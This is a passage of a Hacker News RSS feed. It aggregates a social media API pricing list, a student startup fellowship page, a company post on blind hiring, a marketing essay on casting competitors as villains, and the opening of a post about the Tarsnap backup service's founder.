<p><strong>API Documentation</strong>: <a href="https://platform.hootsuite.com/docs/api/index.html#section/Introduction">link</a></p>



<p><strong>Pricing</strong>: <a href="https://hootsuite.com/plans">$29 to $599</a> a month</p>







<h3>3. <a href="https://hootsuite.com/"><span><strong>Buffer</strong></span></a></h3>



<p><strong>Tagline:</strong> Tell your brand’s story and grow your audience with a publishing, analytics, and engagement platform you can trust.</p>



<p><strong>API Documentation</strong>: <a href="https://buffer.com/developers/api">link</a> – no new developer accounts after 2019</p>



<p><strong>Pricing</strong>: <a href="https://buffer.com/pricing/publish">$15 to $99</a> a month</p>







<h3>4. <strong><a href="https://www.socialoomph.com/"><span>SocialOomph</span></a></strong></h3>



<p><strong>Tagline:</strong> Boost your productivity with advanced post scheduling tools.</p>



<p><strong>API Documentation</strong>: <a href="https://www.socialoomph.com/developers/api/">link</a></p>



<p><strong>Pricing</strong>: <a href="https://www.socialoomph.com/pricing/">$20 to $83</a> a month</p>







<h3>5. <strong><strong><a href="https://amplifr.com/"><span>Amplifr</span></a></strong></strong></h3>



<p><strong>Tagline:</strong> In&nbsp;all social networks from one window, metrics from posts to&nbsp;projects, collaboration and automation of&nbsp;routine.</p>



<p><strong>API Documentation</strong>: <a href="https://amplifr.docs.apiary.io/#">link</a></p>



<p><strong>Pricing</strong>: <a href="https://amplifr.com/en/prices/">$30 to $500 a month</a></p>







<p>If you have thoughts on these tools or know of others we didn’t mention, drop us a <a href="https://www.ayrshare.com/cdn-cgi/l/email-protection#41323431312e33350120383332292033246f222e2c">line</a> to let us know.</p>




	</div>
</div></div>]]>
            </description>
            <link>https://www.ayrshare.com/best-social-media-posting-and-scheduling-apis-of-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271513</guid>
            <pubDate>Tue, 25 Aug 2020 14:12:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Delta Fellowship]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271478">thread link</a>) | @maxkohnke
<br/>
August 25, 2020 | https://human.capital/deltafellowship | <a href="https://web.archive.org/web/*/https://human.capital/deltafellowship">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      <!-- ======= About Section ======= -->
      <section id="about">
        <div>
          <div>
            <div>
              <h3>
                $50k to start building something meaningful
              </h3>
              <p>
                  We’ll give you the funds and resources you need to explore
                  your ideas and learn how to be a better founder. This isn’t
                  just about the money—it’s about helping you understand and
                  navigate the venture world.
                </p>
            </div>
            <div>
              <div>
                <ul>
                  <li>
                    A <span>$50k</span> grant
                  </li>
                  <li>
                    Hands-on support from our
                    <span>cofounders</span>
                  </li>
                  <li>
                    Introductions to
                    <span>leaders at our portfolio companies</span>, who can teach you about data infrastructure, hiring your
                    first 5 employees, and other topics you’re interested in
                  </li>
                  <li>
                    Access to a
                    <span>network of college students</span>
                    who are as ambitious and eager to build as you are
                  </li>
                  <li>
                    Exposure to the
                    <span>venture capital</span>
                    world—you’ll see firsthand how Human Capital’s people-first
                    investment approach allows us to evaluate and work with
                    founders across stages
                  </li>
                  <li>
                    <span>Mentorship</span> from
                    other founders, many of whom started their companies in
                    college and went on to raise funding from top tier venture
                    funds
                  </li>
                </ul>
              </div>
            </div>
          </div>
          <hr>
          <div>
            <div>
              <h3>
                Learn from other successful young entrepreneurs
              </h3>
              <p>
                  Being a student founder comes with unique challenges. We’ll
                  pair you with mentors who were in your shoes not long ago—and
                  have since turned their startups into high growth companies.
                </p>
            </div>
          </div>
          <div>
            <div>
              <div>
                <p><img src="https://human.capital/assets/img/contents/members/brex_white.png">
                </p>
                <h6>Henrique Dubugras</h6>
                <p><i><h6>Cofounder</h6></i></p><h6>Stanford (dropped out ‘17)</h6>
              </div>
            </div>
            <div>
              <div>
                <p><img src="https://human.capital/assets/img/contents/members/agora_white.png">
                </p>
                <h6>Maria Rioumine</h6>
                <p><i><h6>Cofounder</h6></i></p><h6>Oxford (graduated ‘14)</h6>
              </div>
            </div>
            <div>
              <div>
                <p><img src="https://human.capital/assets/img/contents/members/bolt_white.png">
                </p>
                <h6>Ryan Breslow</h6>
                <p><i><h6>Cofounder</h6></i></p><h6>Stanford (dropped out ‘14)</h6>
              </div>
            </div>
            <div>
              <div>
                <p><img src="https://human.capital/assets/img/contents/members/vise_white.png">
                </p>
                <h6>Runik Mehotra</h6>
                <p><i><h6>Cofounder</h6></i></p><h6>Penn (dropped out ‘19)</h6>
              </div>
            </div>
          </div>
          <div>
            <div>
              <div>
                <p><img src="https://human.capital/assets/img/contents/members/scale.png">
                </p>
                <h6>Alex Wang</h6>
                <p><i><h6>Founder</h6></i></p><h6>MIT (dropped out ‘16)</h6>
              </div>
            </div>
            <div>
              <div>
                <p><img src="https://human.capital/assets/img/contents/members/vise_white.png">
                </p>
                <h6>Samir Vasavada</h6>
                <p><i><h6>Cofounder</h6></i></p><h6>Pre-college dropout</h6>
              </div>
            </div>
            <div>
              <div>
                <p><img src="https://human.capital/assets/img/contents/members/monthly.png">
                </p>
                <h6>Valentin Perez</h6>
                <p><i><h6>Cofounder</h6></i></p><h6>Brown (graduated ‘18)</h6>
              </div>
            </div>
            <div>
              <div>
                <p><img src="https://human.capital/assets/img/contents/members/switch.png">
                </p>
                <h6>Liana Kadisha Cohn</h6>
                <p><i><h6>Cofounder</h6></i></p><h6>Stanford (graduated ‘16)</h6>
              </div>
            </div>
          </div>
        </div>
      </section>
      <!-- End About Section -->

      <section>
        <div>
          <div>
            <div>
              <h3>
                We’re looking for exceptional people
              </h3>
              <p>
                  We want to get to know you. If you have a problem you’re
                  obsessed with solving, that’s great—but it’s not required, and
                  it’s not what we’re evaluating.
                </p>
            </div>
            <div>
              <div>
                <div>
                  <p>You’re ambitious.</p>
                  <p>
                    You have lofty goals for your future. You’re not content
                    with the conventional. You want to do something different.
                  </p>
                </div>
                <div>
                  <p>You’re innovative.</p>
                  <p>
                    You’re constantly solving the problems you see—building
                    productivity hacks, creatively patching up the hole of your
                    dorm room, leading a new initiative to drive change in your
                    school.
                  </p>
                </div>
                <div>
                  <p>You’re relentless.</p>
                  <p>
                    Starting a company isn’t always easy and fun. It’s a rocky
                    journey of ups and downs. You have to manage uncertainty and
                    push through discomfort.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section id="timeline">
        <div>
          <div>
            <div>
              <p>
                Interviews conducted on a rolling basis
              </p>
              
            </div>
          </div>
          <div>
            <div>
              
              <p>
                Interviews conducted on a rolling basis
              </p>
            </div>
          </div>
          <hr>
          <div>
            <p>
              <h3>
                Built for student founders, by student founders
              </h3>
            </p>
            <div>
              <p>
                Our founders, Baris and Armaan, met on the first day of
                international student orientation at Stanford. That year, Baris
                started a web development automation business, while Armaan
                began investing in companies started by his entrepreneurial
                peers.
              </p>
              
              <p>
                Both realized they loved helping students with a cerebral desire
                to have a meaningful, material impact. Sometimes that meant
                guiding them to jobs at high growth startups. Sometimes it meant
                helping them build their own startups (and investing in them).
                Sometimes it was a combination of both.
              </p>
              
              <p>
                The desire to help students make a meaningful impact led to the
                founding of Human Capital. Over the last 5 years, we’ve built
                relationships with more than 5,000 engineers and entrepreneurs
                and spent countless hours helping young founders dissect
                industries, test early betas, and acquire their first customers.
              </p>
              
              <p>
                We’ve invested in six companies that are now worth over $1B
                each, and have over $200M in AUM. And we’re eager to partner
                with more great young founders.
              </p>
            </div>

            <!-- <div class="col-lg-3 content">
              <div class="photo-box"> 
              </div>
              <p class="photo-caption">
                Henrique Dubugras, founder of Brex, at one of the first
                networking events Baris hosted in 2017—back when Human Capital
                was known as Nav Talent, and before Henrique had dropped out to
                focus on Brex full time. Not long after, we placed two of the
                first ten engineers at the company. Brex is now worth $2.6B
              </p>
            </div> -->
          </div>
          <div id="counts">
            <div>
              <div>
                <p><span>$200M+</span>
                </p>
                <p>Assets under management</p>
              </div>
            </div>
            <div>
              <div>
                <p><span>6</span>
                </p>
                <p>
                    Companies with $1B+ valuation in our investment portfolio
                  </p>
              </div>
            </div>
            <div>
              <div>
                <p><span>5,000+</span>
                </p>
                <p>Engineers and founders in our community</p>
              </div>
            </div>
            <div>
              <div>
                <p><span>12</span>
                </p>
                <p>
                    Companies with $1B+ valuation where we’ve placed members as
                    early engineers
                  </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      <!-- ======= Apply now Section ======= -->
      <section id="apply-now">
        
      </section>
      <!-- ======= Apply now Section end======= -->
      <!-- ======= Frequently Asked Questions Section ======= -->
      <section id="faq">
        <div>
          <h3>
            FAQ
          </h3>

          <div>
            <div>
              <h4>Who can apply?</h4>
              <p>
                Incoming, current, and recent undergraduate and graduate
                students.
              </p>
            </div>
            <div>
              <h4>
                Do I need to take a semester off from school?
              </h4>
              <p>
                No, but we recommend it. We expect you to dedicate a significant
                amount of time to the program, but it’s up to you.
              </p>
            </div>
            <div>
              <h4>
                Do I have to drop out of college after the program?
              </h4>
              <p>
                No. You should do what you think is best—whether that means
                going back to college, pursuing your startup idea, or something
                else entirely.
              </p>
            </div>
            <div>
              <h4>
                Are you looking for solo founders or co-founder pairs?
              </h4>
              <p>
                Either. You can apply as a solo founder, but we’ve found most
                successful ventures are built by teams—so if you know someone
                exceptional you’d like to build with, mention them in the
                application and encourage them to apply.
              </p>
            </div>
            <div>
              <h4>When does the program run?</h4>
              <p>
                August through December.
              </p>
            </div>
            <div>
              <h4>
                Can I apply and participate as an international student?
              </h4>
              <p>
                Yes. We hope you’ll apply, no matter what country you live in.
                If you’re selected, you can work from wherever you want. If you
                have a visa, we’ll work with you to find the best way to have
                you participate. (There are tax implications for international
                students that you’ll need to handle since each country has its
                own specific tax policies and regulations, but we’ll work
                through any issues with you together.)
              </p>
            </div>
            <div>
              <h4>
                Do I need to be in San Francisco for the fellowship?
              </h4>
              <p>
                No. Given the …</p></div></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://human.capital/deltafellowship">https://human.capital/deltafellowship</a></em></p>]]>
            </description>
            <link>https://human.capital/deltafellowship</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271478</guid>
            <pubDate>Tue, 25 Aug 2020 14:08:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Avo Eliminates Biases in Hiring]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271434">thread link</a>) | @kelseyfecho
<br/>
August 25, 2020 | https://www.avo.app/blog/how-we-hire-at-avo | <a href="https://web.archive.org/web/*/https://www.avo.app/blog/how-we-hire-at-avo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Every application is reviewed blind to ensure fairness.</p><p>Avo is committed to hiring talent of diverse backgrounds because not only does <a href="https://www.weforum.org/agenda/2019/04/business-case-for-diversity-in-the-workplace/">the data now demonstrate the business validity</a> of having an inclusive workplace, but because it’s the right thing to do.&nbsp;</p><h3>With Systematic Structures Against Bias</h3><p>It is one of my deep passions to combat the unconscious bias that most of us have (I recommend taking the <a href="https://implicit.harvard.edu/implicit/takeatest.html">Harvard managed test for unconscious bias</a>). Unfortunately, as Iris Bohnet discusses in In <a href="https://www.goodreads.com/book/show/27311743-what-works#:~:text=Gender%20equality%20is%20a%20moral%20and%20a%20business%20imperative.&amp;text=Presenting%20research%2Dbased%20solutions%2C%20Iris,and%20the%20lives%20of%20millions.">What Works: Gender Equality by Design</a>, it’s difficult to rewire our brains. She even refers to research showing how we subject ourselves to our pendulum swinging backwards whenever we try to educate ourselves (much like we think we deserve a break from being unbiased after the hard work of learning how not to be biased). Instead, the most efficient tool to combat bias is to structure hiring and compensation processes so we remove any opportunity to act on bias.&nbsp;</p><p>When we looked into how we could make this a reality for hiring at Avo, we found <a href="https://www.beapplied.com/">Applied</a>. It’s a&nbsp; platform designed following best practices to prevent the opportunity for unconscious bias. Instead of focusing on the person’s background, the Applied process asks the candidate to reflect on situations related to the role, and enables a structured, unbiased review of the person’s potential and ability.</p><h3>How We Use Applied At Avo</h3><p>These questions outline situations that may come up – directly or indirectly related to the role. Some of the situations are complicated, and this is a great opportunity to shed a light on how aligned Avo and the candidate are in how to handle them. The answers are then anonymized and randomized for a blind review.. It means that each answer is reviewed individually, without us knowing anything about the candidate, or their other answers.&nbsp;&nbsp;</p><p>When hiring for <em>Growth Marketing</em> we asked what recent campaign for a technical product stood out to them. When hiring for <em>Product Designer</em> we ask how to respond to a customer feature request or inconsiderate feedback from someone in a leadership position. When hiring for <em>Infrastructure Developer</em> we ask how they’d address a design issue in the core data model.&nbsp;&nbsp;</p><p>It’s our job as founders to find highly skilled individuals for each and every role. It’s hard to adequately account for one’s own biases, even when acknowledged and worked against. And as a data scientist, I believe in a systematic solution. That’s why Avo chose Applied’s blind process as a way to ensure fairness throughout the process, which is really important to me, personally.&nbsp;</p><p>Working against bias is more than addressing the obvious gender and race discrimination we face in the tech industry. It’s also a matter of making sure our culture is accessible to anyone who does good work, and good work will be celebrated no matter who does it. There are also those who feel like they might not fit a stereo-type of the industry, or those who live far away from tech-centric cities. And even still, some feel like they may have never been given the opportunity to demonstrate their skills.&nbsp;</p><p>We find that with this process, we’re able to really get a sense of the person’s fit for the role; removing any bias we might have had, consciously or subconsciously, on the person’s age, gender, sexuality, race, nationality, location, or background.&nbsp;</p><p><strong>What ultimately matters is we’re able to hire the right people, fast, and that the people we want to work with are willing to go through this process with us.&nbsp;</strong></p><h3>What do the applicants think?&nbsp;</h3><p>The feedback we’ve received so far has been outstanding. 9 out of 10 would recommend this process – and that includes a lot of people we could not hire. To exemplify, here are a few anonymous quotes from people who have gone through this process:</p><p>"I wish more companies assessed their candidates this way. I hope this eliminates bias."<br></p><p>“Just applied, I LOVED that application process"</p><p>"That fact y'all are actually testing their knowledge is amazing and not just judging a book by the cover, or <em>well</em> – <em>person</em> by a piece of paper (resume!). I like the alternative approach of blind question-answer review and screening for hiring bias!"<br></p><p>"I totally enjoyed this application process compared to other application formats. I'm reflecting and thinking based on the given scenarios. I have learned a lot and I love it."</p><p>We find this dive into our candidates’ problem-solving skills, which ultimately is what we’re hiring them for, has been a huge success. Aligning on ability seems fairer than judging someone based on what they look like or the logos on their CVs. And we found that the people we’ve met in our hiring process love that we let their work stand for itself; regardless of their background, where they’re from, or what they’ve done in the past.&nbsp;</p><div><p>My personal goal for 2020 was to maintain a gender balance in Avo through our 2020 hiring. Now we’ve succeeded in making sure more than 50% of our team is female identifying. This is a rare feat, which I’m proud of. I also understand that this means it’s time to set more aggressive goals. It is imperative to my co-founder, Solvi, and myself, to continue to build inclusive culture at Avo. </p><p>– Stefania Olafsdottir<br>Avo CEO and co-founder</p></div><p><strong>What are you waiting for, we are hiring for two roles!&nbsp;</strong></p><p><a href="https://www.avo.app/jobs"><strong>Now is the time to apply. We want you to join us &gt;&gt;&nbsp;</strong></a></p></div></div>]]>
            </description>
            <link>https://www.avo.app/blog/how-we-hire-at-avo</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271434</guid>
            <pubDate>Tue, 25 Aug 2020 14:02:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You Need a Nemesis]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271340">thread link</a>) | @thinking_slow_
<br/>
August 25, 2020 | https://www.animalz.co/blog/you-need-a-nemesis/ | <a href="https://web.archive.org/web/*/https://www.animalz.co/blog/you-need-a-nemesis/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2280" role="article" itemscope="" itemtype="http://schema.org/BlogPosting">

	

	<div>

		<div>
			<section>
														<p><img src="https://2l4ff1gokdmn317w442ckjyu-wpengine.netdna-ssl.com/wp-content/uploads/intervention/cache/attentie-attentie-ig7vN6OkGNE-unsplash-scaled-e1598344745396-2048x1234-2212294583.jpg">
					</p>
								<!-- wp:paragraph -->
<div><p>It isn’t always enough to cast your company as the hero—sometimes, you also need a villain. </p><p>DHH’s recent spat with Apple turned a pedestrian product launch into an epic battle between a corporate juggernaut and the plucky underdogs of Basecamp. A <a href="https://twitter.com/dhh/status/1275070000814948353?s=20">hundred thousand product sign-ups</a> followed.</p><p>Much of Box’s earliest press coverage can be traced back to a <a href="https://techcrunch.com/2015/01/22/box-has-always-been-about-reshaping-enterprise-software/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAAFl7N1icsmzGQEIAh-x7jAIvo5TOrq1tC3fuAZy3v6HFQf0EJcKKYAC1gGUZ_FQ5rE4faMDZBouACHEgy4i-eIi8ZQkqZOrbDWNAMa1kckujCUYiOEQ9nHFU2q4Q9KxaFRQ4oQEAggxM_KG3Wll7xxAx_dB2tUUFhfKO-Spsa_Hf">towering billboard</a> on California’s Route 101, proudly proclaiming: <em>“Box.net is like Sharepoint, but without the servers, setups costs, manuals, downtime, firewall restrictions . . .”</em></p><p>To this day, I can’t think of HubSpot without imagining a shadowy “<a href="https://blog.hubspot.com/blog/tabid/6307/bid/2989/inbound-marketing-vs-outbound-marketing.aspx">outbound marketer</a>” physically cramming spam mail through my letter box.</p><p>These brands are case studies in what Paul Graham called “<a href="https://twitter.com/paulg/status/1273233413261209600?s=20">beef marketing</a>”: find the adversary you have a strategic, beneficial beef with, and cast them as the villain in your story.</p></div>
<!-- /wp:paragraph -->

<!-- wp:more -->
			</section>
		</div>

	</div>

	<div>

		<div>
			<section>
				
<!-- /wp:more -->

<!-- wp:heading -->
<h2>Villains Make Heroes Look Better</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>HubSpot, Basecamp, and Box understand a core tenet of storytelling: villains exist to make heroes look better.</p><p>Without a force to fear, fight, and eventually overcome, your story isn’t worth telling. Remove Sauron from <em>The Lord of the Rings </em>and you have a flaccid tale of Frodo’s privilege and family squabbles. Without the nemesis of “outbound marketing,” the redemption offered by inbound marketing is meaningless.</p><p>There’s a lot going for the hero vs. nemesis dynamic:</p></div>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><strong>Build empathy.</strong> A day in the life of your target customer is fraught with frustration, like—in the case of HubSpot’s target audience—an inbox of junk mail, obnoxious telesales callers and internet-ruining pop-up ads. Vilification allows you to call out the struggle, empathize with the reader, and nudge your product into view:<em> “You’re sick of this. So are we. Here’s the product we built to fix it.”</em></li><li><strong>Differentiate. </strong>Most marketing is pretty saccharine. Measured criticism and, heaven forbid, acknowledging the existence of your competitors, can cut through the mix like nothing else. Picking a fight—albeit in a measured, strategic way—is just downright interesting.</li><li><strong>Change your industry.</strong> DHH’s critique of Apple gained traction because of its valid concern: monopoly power. Many of the story’s loudest amplifiers were other company founders who had fallen afoul of seemingly arbitrary judgments from Apple. Criticizing Apple led to Hey’s approval and, according to DHH, it “<a href="https://twitter.com/dhh/status/1276158293375934470?s=20">paves an illuminated path</a>” for other apps to follow.</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>HubSpot, Basecamp, and Box illustrate three different approaches to “beef marketing,” and three different ways you can cast a villain in your own story. They are (in order of ascending spiciness):</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2285,"sizeSlug":"large"} -->
<figure><img src="https://2l4ff1gokdmn317w442ckjyu-wpengine.netdna-ssl.com/wp-content/uploads/2020/08/You-Need-a-Nemesis-2.png" alt=""></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>You vs. the Legacy Solution</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Spice Level: 🌶️</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>HubSpot’s vocal opposition to “outbound marketing” is an example of squaring off with a legacy solution—an older, dated, and relatively inefficient way of achieving the same goals as your product.</p><p>Spreadsheets are the classic legacy solution.<a href="https://twitter.com/thinking_slow/status/1255874409086287879?s=20"> As this viral tweet posits</a>, the chances are high that someone, somewhere, is using the humble spreadsheet to achieve pretty much the same thing your product does. In the same way, outbound marketing is just an amalgamation of lots of legacy marketing tactics—like cold calling and direct mail.</p></div>
<!-- /wp:paragraph -->

<!-- wp:html -->
<blockquote><p lang="en" dir="ltr">*spreadsheets* are the main competitor for 90% of software startups</p>— Ryan Law (@thinking_slow) <a href="https://twitter.com/thinking_slow/status/1255874409086287879?ref_src=twsrc%5Etfw">April 30, 2020</a></blockquote> 
<!-- /wp:html -->

<!-- wp:paragraph -->
<div><p>Legacy solutions are soft targets for vilification because they’re often processes or products so old as to be virtually faceless. You can criticize spreadsheets freely: they’re slow, prone to human error, and difficult to scale, and Excel’s board members won’t take offense at the critique. Similarly, outbound marketing is a total straw man: it isn’t a person, or a company, or really even a single process, so there’s nobody to resist the critique.</p><p>As a result, any company can cast a legacy solution as the villain of their story. Many do:</p></div>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Coda’s entire go-to-market messaging is built around its opposition to spreadsheets, epitomized by the tagline <em>“</em><a href="https://coda.io/welcome" target="_blank" rel="noreferrer noopener"><em>Enough of this sheet</em></a>.<em>”</em></li><li>Vyond’s animation software <a href="https://www.vyond.com/resources/the-6-best-business-presentation-software-alternatives-to-powerpoint/" target="_blank" rel="noreferrer noopener">takes aim at PowerPoint</a>, another last-generation product in the same vein as Excel.</li><li>Greenlight Guru pits itself against old-fashioned processes and “<a href="https://www.greenlight.guru/blog/legacy-quality-management-systems" target="_blank" rel="noreferrer noopener"><em>the lure of legacy quality management systems</em></a>,<em>”</em> highlighting the pitfalls of using paper or <em>“digital paper”</em> solutions like Google Docs.</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>These legacy solutions are easy enough to find. They’re the products and processes your product is bought to replace, discussed in every sales call and likely still used by laggardly hold-outs. If in doubt—trash-talk the spreadsheet.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>You vs. the Big Guy/Gal</strong></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Spice Level: 🌶️🌶️</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>Basecamp vs. Apple is an example of taking up arms against your industry’s biggest players. It works because most of us <a href="https://hbr.org/2010/11/capitalizing-on-the-underdog-effect">enjoy rooting for the underdog</a>. We like to see small, plucky startups overcoming the odds and beating faceless corporate behemoths.</p><p>In the Apple example, DHH used the ubiquity of a globally recognized brand to raise awareness for a less famous product. His bombastic <a rel="noreferrer noopener" href="https://twitter.com/dhh/status/1272968382329942017?s=20" target="_blank">tweetstorms</a> and <a rel="noreferrer noopener" href="https://m.signalvnoise.com/on-apples-monopoly-power-to-destroy-hey/" target="_blank">blog posts</a> garnered coverage from media outlets like Wired, TechCrunch, and Engadget. By piggybacking on the vaunted Apple brand, Basecamp turned a pedestrian problem—app store regulation—into a huge PR coup.</p></div>
<!-- /wp:paragraph -->

<!-- wp:html -->
<blockquote><p lang="en" dir="ltr">Like any good mafioso, they paid us a visit by phone. Stating that, firstly, that smashing our windows (by denying us the ability to fix bugs) was not a mistake. Then, without even as much of a curtesy euphemism, said they'd burn down our store (remove our app!), lest we paid up.</p>— DHH (@dhh) <a href="https://twitter.com/dhh/status/1272969688507539457?ref_src=twsrc%5Etfw">June 16, 2020</a></blockquote> 
<!-- /wp:html -->

<!-- wp:paragraph -->
<div><p>Like legacy solutions, huge companies are relatively easy targets. A company of Apple’s size is used to criticism and weathers it on a regular basis (as <a href="https://twitter.com/Austen/status/1273236329178869761?s=20">Austen Allred</a> points out, <em>“Apple has plenty of experience with ‘I don’t care what you think’ as a stance”</em>). The blow is softened further by the decision to attack a nebulous, unsexy part of the bigger Apple business—App Store regulation instead of, say, the iPhone.</p><p><a rel="noreferrer noopener" href="https://wistia.com/" target="_blank">Wistia</a> is another company that’s adopted a strategic beef with an industry giant: YouTube. The giant video platform is referred to as a<em> “<a rel="noreferrer noopener" href="https://wistia.com/learn/marketing/where-to-share-your-brands-video-content-besides-youtube" target="_blank">legacy social network</a>,”</em> with warnings made to avoid a<em> “world where Google keeps your traffic, owns your subscribers, and controls their viewing experience.”</em> There’s even a guide that walks the reader through the steps required to <a rel="noreferrer noopener" href="https://wistia.com/learn/marketing/how-to-delete-your-youtube-channel" target="_blank">delete their YouTube channel</a>.</p></div>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>You vs. your Competitors</strong></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>Spice Level: 🌶️🌶️🌶️</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>Box took beef marketing to its logical conclusion by leveling criticism at the company’s direct competitors. Instead of tip-toeing, Box went<a href="https://techcrunch.com/2015/01/22/box-has-always-been-about-reshaping-enterprise-software/"> straight for the jugular</a>.</p><p>Many companies are reluctant to acknowledge the existence of their competitors, but loyal customers are not the product of information asymmetry. Most customers already know about your competitors.</p></div>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Against that backdrop, Box understands that an honest critique of the competition is a powerful differentiator. It’s a chance to make the comparison on your terms. It raises awareness for your product among the very customer base you’re trying to court. It’s useful for the customer, and it oozes confidence.<br></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":2283,"sizeSlug":"large"} -->
<figure><img src="https://2l4ff1gokdmn317w442ckjyu-wpengine.netdna-ssl.com/wp-content/uploads/2020/08/image-10.png" alt="box-billboard.jpg"></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<div><p><a href="https://techcrunch.com/2015/01/22/box-has-always-been-about-reshaping-enterprise-software/">Source</a></p><p>Box was able to make these feature comparisons because they took pains to offer a truly competitive product. You can likely do the same: most founders aim to build products that are better and different than anything that’s come before. There’s no need to be coy when you’ve built a best-in-class product—calling out the limitations of competitors is fair game.</p></div>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<div><p>Even without feature parity, direct comparisons can work in your favor: if you’re not strictly <em>better, </em>highlight how you’re <em>different.</em></p><p><a rel="noreferrer noopener" href="https://www.podia.com/" target="_blank">Podia</a> is an example for competitor critique done well. They harness a strategy we call “competitor alternative” content: using the natural search volume for keywords like “<a rel="noreferrer noopener" href="https://www.podia.com/clickfunnels-alternative" target="_blank">clickfunnels alternative</a>” or “<a rel="noreferrer noopener" href="https://www.podia.com/teachable-alternative" target="_blank">teachable alternative</a>” to create search-friendly comparison pages. Each page includes testimonials from post-switch users, a direct feature comparison, and a clear product call-to-action.</p></div>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Crying Wolf</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<div><p>The power of a beef marketing strategy stems largely from its rarity; few companies call out their rivals, so we take notice when one does. We don’t follow brands that cry wolf, because the strategy loses efficacy with each subsequent crusade (case in point: I’m starting to develop cynicism around Basecamp’s ongoing feud with </p><a href="https://www.animalz.co/blog/thought-leadership-content/"><s>offices</s> <s>meetings</s> <s>email</s> big tech</a><p>).</p><p>If you want to incorporate the power of beef into your marketing, use it sparingly and deliberately.</p></div>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<div><p>Each of the companies covered here—HubSpot, Box, Basecamp, Coda, Wistia, and Podia—spend far more time and energy on the “hero” part of their marketing (building incredible products, adding value through content) than they do the “nemesis” portion. They use villains as a point of contrast—a way of bringing their great work into sharp relief.</p><p><em>H/T to Benyamin Elias for introducing me to the term beef marketing <a rel="noreferrer noopener" href="https://masters.substack.com/p/oatly-picking-a-fight-marketing" target="_blank">in his newsletter</a>.</em></p></div>
<!-- /wp:paragraph -->				<div>
	
	<p><img src="https://2l4ff1gokdmn317w442ckjyu-wpengine.netdna-ssl.com/wp-content/uploads/2019/06/ryanlaw-125x125.png" width="125" height="125" alt="Ryan Law"></p><h5><a href="https://www.animalz.co/blog/author/ryan-law/">
		Ryan Law	</a></h5>

			<a href="https://twitter.com/thinking_slow" target="_blank">
			<svg><use xlink:href="#icon-twitter"></use></svg> Follow @thinking_slow		</a>
	
	<p>Ryan is the Director of Marketing at Animalz, an agency that provides high-end content marketing solutions to SaaS and tech companies.</p>
</div>			</section>
		</div>

		
	</div>

	

</article></div>]]>
            </description>
            <link>https://www.animalz.co/blog/you-need-a-nemesis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271340</guid>
            <pubDate>Tue, 25 Aug 2020 13:52:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tarsnap Podcast episode with FreeBSD ex security officer Colin]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271291">thread link</a>) | @devrustr
<br/>
August 25, 2020 | https://blog.firosolutions.com/2020/08/tarsnap-podcast/ | <a href="https://web.archive.org/web/*/https://blog.firosolutions.com/2020/08/tarsnap-podcast/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  





<p><img alt="tarsnap security headlines podcast with Colin Percival" src="https://blog.firosolutions.com/tarsnap.png"></p><p>Tarsnap is a backup service running with the slogan “Online backups for the truly paranoid”.<br>
The service has well earned its slogan as a secure backup option.<br>
Created in 2006 by at the time FreeBSD’s security officer Dr. Colin Percival, who<br>
was responsible for FreeBSD’s security advisory.<br>
Colin is not only a successful entrepreneur but also a dedicated FreeBSD user.<br>
After dealing with the pain of running Tarsnap for himself for a while he decided<br>
to follow Paul Graham’s<br>
wisdom of “There are certain things that naturally needs to be companies” and<br>
the Tarsnap company is born
While modern startup companies spend there budget on marketing campaigns, pouring<br>
in Money into Google Adwords and similar service,
Colin focused on building a great product that resulted in its user base adoption.  He
even experimented with google adwords spending around 200 usd, but it didnt<br>
result in any new users. Proving that when
you provide a good value to the market, the market rewards you.</p>

<p>Colin has been getting his hands dirty with FreeBSD in the late 1990’ies<br>
